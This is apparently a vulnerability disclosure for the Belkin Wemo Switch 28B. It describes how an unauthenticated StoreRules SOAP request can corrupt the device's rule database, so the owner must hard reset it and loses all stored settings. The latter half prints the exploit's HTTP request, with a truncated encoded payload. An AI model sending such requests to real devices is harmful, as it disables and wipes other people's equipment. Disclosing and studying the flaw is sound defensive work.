# DoS Vulnerability in the Wemo Switch 28B

The Wemo Switch is a smart socket developed by Belkin. In this blogpost, I consider the Wemo switch 28B (sn 221441K010028B), whereas the firmware version is WeMo_WW_2.00.11057.PVT-OWRT-SNS.

The way the rules are handled in the device's firmware allows an attacker to perform a DoS on the device and corrupt the database in a way that the app cannot recover, making the user unable to set/remove any rules.

In particular, the device stores rules in an internal database, which is sent by the app (in a compressed format), every time a rule is added (or removed). No authentication is required.

This repo contains the exploit to perform the DoS. As you can see, once the new database is accepted by the device, further rules from the app are not accepted, and the user must hard reset the device, losing all the information they previously stored.

Below, the generated HTTP request.

```
 POST /upnp/control/rules1 HTTP/1.1\r\n
    Host: 10.250.250.144:49153\r\n
    Accept: */*\r\n
    Content-Type: text/xml; charset="utf-8"\r\n
    SOAPACTION: "urn:Belkin:service:rules:1#StoreRules"\r\n
    User-Agent: CyberGarage-HTTP/1.0\r\n
    Content-Length: 1004\r\n
    <?xml
        version="1.0"
        encoding="utf-8"
        ?>
    <s:Envelope
        xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
        s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <s:Body>
            <u:StoreRules
                xmlns:u="urn:Belkin:service:rules:1">
                <ruleDbVersion>
                    12
                    </ruleDbVersion>
                <processDb>
                    1
                    </processDb>
                <ruleDbBody>
                     [truncated]&lt;![CDATA[UEsDBBQAAAAIAIN6kEyxkTDHIgEAAADAAAASABwAdGVtcHBsdWdpblJ1bGVzLmRiVVQJAAOWIdValiHVWnV4CwABBOgDAAAE6AMAAO3Wu0rDYACG4T9tjba1WFwcumRU1MkbsEoXETwuTqVKBMUDar2zDt6JVyHi6uQvCEIFD4ux9nnCGxIC4cuWvZ3Nk36eHV9en/f62UpohiQJq1kWQmj
                    </ruleDbBody>
                </u:StoreRules>
            </s:Body>
        </s:Envelope>
 ```
